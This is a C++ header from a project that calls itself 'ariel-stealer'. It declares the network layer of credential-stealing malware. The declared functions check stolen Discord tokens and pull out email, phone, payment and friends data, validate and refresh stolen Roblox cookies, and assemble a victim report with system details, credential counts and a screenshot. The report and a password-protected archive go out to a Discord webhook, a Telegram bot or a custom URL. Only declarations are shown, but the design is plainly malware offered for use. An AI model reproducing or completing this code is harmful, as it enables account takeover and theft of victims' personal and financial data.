#pragma once

#include <cstddef>
#include <filesystem>
#include <string>
#include <vector>

namespace ariel::net {

struct result {
    bool ok;
    std::string detail;
};

struct discord_token_input {
    std::string source;
    std::string token;
};

struct discord_account {
    std::string source;
    std::string token;
    bool valid = false;
    std::string id;
    std::string username;
    std::string discriminator;
    std::string global_name;
    std::string email;
    std::string phone;
    std::string locale;
    std::string created;
    std::string avatar_url;
    std::string banner_url;
    long long accent_color = 0;
    bool verified = false;
    bool mfa_enabled = false;
    int premium_type = 0;
    unsigned long long flags = 0;
    unsigned long long public_flags = 0;
    std::string badges;
    std::size_t guild_count = 0;
    std::string guilds;
    std::size_t friend_count = 0;
    std::string friends;
    std::string payment;
    std::string subscriptions;
    std::string error;
};

std::vector<discord_account> inspect_discord_tokens(
    const std::vector<discord_token_input>& tokens);
std::string describe_account(const discord_account& account, bool full_token = false);

struct roblox_cookie_input {
    std::string source;
    std::string profile;
    std::string cookie;
};

struct roblox_account {
    std::string source;
    std::string profile;
    std::string cookie;
    std::string source_cookie;
    bool refreshed = false;
    bool valid = false;
    std::string id;
    std::string username;
    std::string display_name;
    std::string error;
};

std::vector<roblox_account> inspect_roblox_cookies(
    const std::vector<roblox_cookie_input>& cookies);

struct discord_report {
    std::string user;
    std::string host;
    std::string local_time;
    std::string os;
    std::string cpu;
    std::string ram;
    std::string display;
    std::string domain;
    std::size_t credentials = 0;
    std::size_t tokens = 0;
    bool ping_everyone = false;
    std::vector<discord_account> accounts;
    std::string thumbnail_url =
        "https://raw.githubusercontent.com/ihateapples/ariel-stealer/refs/heads/main/icon.png";
};

result send_discord(const std::string& webhook_url,
                    const std::filesystem::path& file,
                    const std::string& password,
                    const std::filesystem::path& screenshot,
                    const discord_report& report);

result send_telegram(const std::string& token,
                     const std::string& chat_id,
                     const std::filesystem::path& file,
                     const std::string& password);

result send_custom(const std::string& url,
                   const std::string& file_field,
                   const std::string& headers,
                   const std::string& fields,
                   const std::filesystem::path& file,
                   const std::string& password);

}  // namespace ariel::net
